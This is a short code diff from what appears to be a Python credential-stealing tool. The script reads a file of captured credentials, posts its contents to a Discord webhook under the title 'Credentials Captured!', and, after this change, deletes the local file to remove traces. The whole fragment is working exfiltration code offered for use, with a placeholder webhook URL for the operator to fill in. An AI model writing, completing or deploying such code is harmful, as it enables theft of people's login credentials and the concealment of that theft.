@@ -73,7 +73,7 @@ f = open("credentials.txt", "r")
 webhook = DiscordWebhook(url = <your url here> ) #==========> your discord webhook url goes here!
 
 embed = DiscordEmbed(title='Credentials Captured!', description=f.read(), color='00FF00')
-embed.set_author(name='c4rb0nX1', url='https://github.com/c4rb0nx1',icon_url='https://i.postimg.cc/ZRzNStMC/IMG-20210331-205034-465.jpg')
+embed.set_author(name='c4rb0nX1', url='https://github.com/c4rb0nx1',icon_url='https://i.postimg.cc/ZRzNStMC/IMG-20210331-205034-465.jpg') # if you know....you know
 webhook.add_embed(embed)
 
 response = webhook.execute()
@@ -81,6 +81,6 @@ response = webhook.execute()
 f.close()
 
 #removing the created "credentials.txt" file after sending the information on discord.
-#os.remove("credentials.txt")
+os.remove("credentials.txt")
 
 #Note: The "credentials.txt" file is created to extend the functionality of the program such as sending it via e-mail in future.
